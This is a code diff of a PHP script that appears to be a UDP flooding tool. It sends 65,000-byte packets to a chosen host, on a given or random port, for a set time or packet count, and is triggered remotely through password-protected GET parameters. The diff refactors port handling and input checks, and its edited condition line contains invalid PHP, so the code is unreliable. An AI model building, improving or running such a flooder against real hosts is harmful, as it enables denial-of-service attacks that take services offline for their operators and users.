@@ -1,4 +1,5 @@
 <?php
+// udp_connect(host,port,packet_size) - send 1 packet to host:port of packet_size
 function udp_connect($h,$p,$ps){
 	$ret = false;
 	$out = str_repeat("0", $ps);
@@ -14,6 +15,11 @@ function udp_connect($h,$p,$ps){
 	return $ret;
 }
 
+// get_port function to avoid duplicate code
+function get_port($port){
+	return (isset($port) && is_numeric($port) && strlen($port) > 0) ? $port : rand(1,65535);
+}
+
 $cli=false;
 
 if(isset($argv)) {
@@ -24,11 +30,10 @@ if(isset($argv)) {
 		// Server
 		foreach($_GET as &$G){
 			$G=htmlspecialchars($G, ENT_QUOTES, 'UTF-8');
-			echo $G;
 		}
 }
 
-if(isset($_GET['host'])&&(isset($_GET['time'])||isset($_GET['packet']))&&(isset($_GET['pass'])||$cli==true)){
+if(isset($_GET['host'])&&((isset($_GET['time']) && is_numeric($_GET['time']))||isset(($_GET['packet']) && is_numeric($_GET['packet']))&&(isset($_GET['pass'])||$cli==true)){
 	
 	// If executed from CLI no password
 	if($cli==false){
@@ -38,8 +43,7 @@ if(isset($_GET['host'])&&(isset($_GET['time'])||isset($_GET['packet']))&&(isset(
 	
 	$packets = 0; 
 	$host = $_GET['host'];
-	$port = $_GET['port'];
-	$port = (isset($port) && is_numeric($port) && strlen($port) > 0) ? $port : rand(1,65535);
+	$port = get_port($_GET['port']);
 	
 	$packet_size = 65000;
 	
